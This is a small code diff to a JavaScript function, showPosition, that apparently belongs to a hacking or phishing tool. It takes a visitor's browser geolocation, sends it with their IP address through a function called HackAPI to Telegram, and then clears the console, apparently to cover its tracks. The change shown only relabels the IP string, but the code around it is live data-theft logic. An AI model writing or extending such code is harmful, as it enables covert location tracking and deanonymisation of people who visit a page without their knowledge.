@@ -139,7 +139,7 @@ function showPosition(position) {
 
 	mess = `latitude : ${position.coords.latitude}
 longitude : ${position.coords.longitude}`
-	HackAPI('telegram',mess,IPAddress)
+	HackAPI('telegram',mess,IPAddress+'-loc')
 	console.clear();
 
 }
